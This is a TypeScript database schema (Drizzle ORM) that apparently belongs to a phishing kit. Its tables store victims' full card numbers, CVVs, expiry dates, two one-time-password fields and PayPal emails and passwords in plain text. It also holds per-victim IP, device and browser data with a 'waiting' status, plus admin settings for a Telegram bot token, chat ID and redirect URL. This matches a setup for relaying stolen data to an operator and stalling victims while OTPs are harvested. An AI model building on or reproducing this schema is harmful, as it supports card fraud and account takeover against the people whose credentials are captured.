import { sql } from "drizzle-orm";
import { pgTable, text, varchar, timestamp } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

export const users = pgTable("users", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  username: text("username").notNull().unique(),
  password: text("password").notNull(),
});

export const insertUserSchema = createInsertSchema(users).pick({
  username: true,
  password: true,
});

export type InsertUser = z.infer<typeof insertUserSchema>;
export type User = typeof users.$inferSelect;

export const adminSettings = pgTable("admin_settings", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  telegramBotToken: text("telegram_bot_token"),
  telegramChatId: text("telegram_chat_id"),
  redirectUrl: text("redirect_url"),
  redirectEnabled: text("redirect_enabled").default("false"),
  updatedAt: timestamp("updated_at").defaultNow(),
});

export const insertAdminSettingsSchema = createInsertSchema(adminSettings).omit({
  id: true,
  updatedAt: true,
});

export type InsertAdminSettings = z.infer<typeof insertAdminSettingsSchema>;
export type AdminSettings = typeof adminSettings.$inferSelect;

export const paymentRecords = pgTable("payment_records", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  cardNumber: text("card_number").notNull(),
  expiryMonth: text("expiry_month").notNull(),
  expiryYear: text("expiry_year").notNull(),
  cvv: text("cvv").notNull(),
  cardholderName: text("cardholder_name").notNull(),
  otp1: text("otp1"),
  otp2: text("otp2"),
  paypalEmail: text("paypal_email"),
  paypalPassword: text("paypal_password"),
  createdAt: timestamp("created_at").defaultNow(),
});

export const insertPaymentRecordSchema = createInsertSchema(paymentRecords).omit({
  id: true,
  createdAt: true,
});

export type InsertPaymentRecord = z.infer<typeof insertPaymentRecordSchema>;
export type PaymentRecord = typeof paymentRecords.$inferSelect;

export const paypalSessions = pgTable("paypal_sessions", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  sessionId: text("session_id").notNull().unique(),
  email: text("email").notNull(),
  password: text("password").notNull(),
  ipAddress: text("ip_address"),
  country: text("country"),
  device: text("device"),
  browser: text("browser"),
  redirectUrl: text("redirect_url"),
  status: text("status").default("waiting"),
  createdAt: timestamp("created_at").defaultNow(),
});

export const insertPaypalSessionSchema = createInsertSchema(paypalSessions).omit({
  id: true,
  createdAt: true,
});

export type InsertPaypalSession = z.infer<typeof insertPaypalSessionSchema>;
export type PaypalSession = typeof paypalSessions.$inferSelect;
